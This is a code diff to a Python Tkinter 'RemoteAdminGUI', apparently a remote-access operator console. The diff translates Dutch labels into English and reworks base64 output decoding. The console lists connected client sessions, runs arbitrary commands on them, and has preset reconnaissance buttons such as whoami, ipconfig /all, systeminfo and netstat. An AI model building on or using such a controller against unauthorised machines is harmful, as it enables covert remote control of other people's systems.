@@ -16,8 +16,8 @@ class RemoteAdminGUI:
         self.running = False
         self.displayed_sessions = []
 
-        # --- Server Instellingen ---
-        config_frame = ttk.LabelFrame(root, text="Server Instellingen")
+        # --- Server Settings ---
+        config_frame = ttk.LabelFrame(root, text="Server Settings")
         config_frame.pack(fill="x", padx=8, pady=4)
 
         ttk.Label(config_frame, text="Host:").grid(row=0, column=0, padx=4, pady=4, sticky="e")
@@ -35,28 +35,28 @@ class RemoteAdminGUI:
         self.start_btn = ttk.Button(config_frame, text="Start Server", command=self.start_server)
         self.start_btn.grid(row=0, column=6, padx=8, pady=4)
 
-        # --- Sessies & Preset Commando's Frame ---
+        # --- Sessions & Preset Commands Frame ---
         middle_frame = ttk.Frame(root)
         middle_frame.pack(fill="both", expand=True, padx=8, pady=4)
 
-        # Sessielijst
-        session_frame = ttk.LabelFrame(middle_frame, text="Actieve Sessies")
+        # Session List
+        session_frame = ttk.LabelFrame(middle_frame, text="Active Sessions")
         session_frame.pack(side="left", fill="both", expand=True, padx=(0, 4))
 
         self.session_list = tk.Listbox(session_frame, selectmode=tk.SINGLE)
         self.session_list.pack(fill="both", expand=True, padx=4, pady=4)
 
-        # Preset Knoppen
-        preset_frame = ttk.LabelFrame(middle_frame, text="Snelknoppen Commando's")
+        # Preset Buttons
+        preset_frame = ttk.LabelFrame(middle_frame, text="Quick Commands")
         preset_frame.pack(side="right", fill="y", padx=(4, 0))
 
         presets = [
             ("Whoami", "whoami"),
             ("IP Config", "ipconfig /all"),
             ("System Info", "systeminfo"),
-            ("Actieve Mappen", "dir"),
-            ("Netwerk Verbindingen", "netstat -ano"),
-            ("Taakbeheer Lijst", "tasklist")
+            ("List Files", "dir"),
+            ("Network Connections", "netstat -ano"),
+            ("Task List", "tasklist")
         ]
 
         for label, cmd in presets:
@@ -67,18 +67,18 @@ class RemoteAdminGUI:
             )
             btn.pack(fill="x", padx=6, pady=3)
 
-        # --- Vrij Invoerveld Commando ---
-        cmd_frame = ttk.LabelFrame(root, text="Handmatig Commando Execution")
+        # --- Manual Command Entry ---
+        cmd_frame = ttk.LabelFrame(root, text="Manual Command Execution")
         cmd_frame.pack(fill="x", padx=8, pady=4)
 
         self.command_entry = ttk.Entry(cmd_frame)
         self.command_entry.pack(side="left", fill="x", expand=True, padx=4, pady=4)
         self.command_entry.bind("<Return>", lambda e: self.send_command())
 
-        self.send_btn = ttk.Button(cmd_frame, text="Verstuur", command=self.send_command)
+        self.send_btn = ttk.Button(cmd_frame, text="Send", command=self.send_command)
         self.send_btn.pack(side="right", padx=4, pady=4)
 
-        # --- Output Log Console ---
+        # --- Output Console ---
         log_frame = ttk.LabelFrame(root, text="Console Output & Responses")
         log_frame.pack(fill="both", expand=True, padx=8, pady=4)
 
@@ -86,7 +86,7 @@ class RemoteAdminGUI:
         self.output.pack(fill="both", expand=True, padx=4, pady=4)
 
     def log(self, msg):
-        """Thread-safe logging naar de GUI console."""
+        """Thread-safe logging to GUI console."""
         def _append():
             self.output.insert(tk.END, str(msg) + "\n")
             self.output.see(tk.END)
@@ -105,10 +105,10 @@ class RemoteAdminGUI:
             self.server.start()
             self.running = True
             self.start_btn.config(state="disabled")
-            self.log(f"[+] Server succesvol gestart op {host}:{port}")
+            self.log(f"[+] Server successfully started on {host}:{port}")
             self.schedule_session_updates()
         except Exception as e:
-            self.log(f"[-] Fout bij starten server: {e}")
+            self.log(f"[-] Error starting server: {e}")
 
     def schedule_session_updates(self):
         if self.running:
@@ -129,7 +129,7 @@ class RemoteAdminGUI:
 
         for session in self.server.sessions:
             if getattr(session, 'alive', True):
-                hostname = session.info.get('hostname') or "Unknown" if hasattr(session, 'info') else "Client"
+                hostname = session.info.get('hostname') if hasattr(session, 'info') and isinstance(session.info, dict) else "Unknown"
                 addr = session.addr[0] if getattr(session, 'addr', None) else "N/A"
                 
                 self.session_list.insert(tk.END, f"Session {session.id}: {hostname} ({addr})")
@@ -156,13 +156,25 @@ class RemoteAdminGUI:
         return session
 
     def execute_preset(self, cmd_text):
-        """Voert een voorgedefinieerd commando uit op de actieve sessie."""
+        """Executes a preset command on the active session."""
         self.send_command(preset_cmd=cmd_text)
+
+    def safe_b64decode(self, data_str):
+        """Safely decodes Base64 strings handling missing or broken padding."""
+        if isinstance(data_str, bytes):
+            data_str = data_str.decode("utf-8", errors="ignore")
+            
+        data_str = data_str.strip()
+        missing_padding = len(data_str) % 4
+        if missing_padding:
+            data_str += '=' * (4 - missing_padding)
+            
+        return base64.b64decode(data_str)
 
     def send_command(self, preset_cmd=None):
         session = self.selected_session()
         if not session:
-            self.log("[-] Geen actieve sessie geselecteerd in de lijst!")
+            self.log("[-] No active session selected in the list!")
             return
 
         cmd = preset_cmd if preset_cmd else self.command_entry.get().strip()
@@ -172,26 +184,22 @@ class RemoteAdminGUI:
         if not preset_cmd:
             self.command_entry.delete(0, tk.END)
 
-        self.log(f"[>] [{session.id}] Uitvoeren: {cmd}")
+        self.log(f"[>] [{session.id}] Executing: {cmd}")
 
         def worker():
             try:
                 resp = session.command({"type": "exec", "cmd": cmd})
                 if resp and "data" in resp:
-                    # Probeer te decoderen als tekst
                     try:
-                        decoded_text = base64.b64decode(resp["data"]).decode("utf-8", errors="replace")
-                        self.log(f"[+] Output van Session {session.id}:\n{decoded_text}")
-                    except Exception:
-                        local_file_path = f"session_{session.id}_output.bin"
-                        data = base64.b64decode(resp["data"])
-                        with open(local_file_path, "wb") as f:
-                            f.write(data)
-                        self.log(f"[+] Binaire data opgeslagen in {local_file_path}")
+                        decoded_bytes = self.safe_b64decode(resp["data"])
+                        decoded_text = decoded_bytes.decode("utf-8", errors="replace")
+                        self.log(f"[+] Output from Session {session.id}:\n{decoded_text}")
+                    except Exception as dec_err:
+                        self.log(f"[-] Base64 decoding failed: {dec_err}")
                 else:
-                    self.log(f"[-] Geen geldige responss verkregen van session {session.id}")
+                    self.log(f"[-] No valid response received from Session {session.id}")
             except Exception as e:
-                self.log(f"[ERROR] Executiefout op session {session.id}: {e}")
+                self.log(f"[ERROR] Execution error on Session {session.id}: {e}")
 
         threading.Thread(target=worker, daemon=True).start()
 
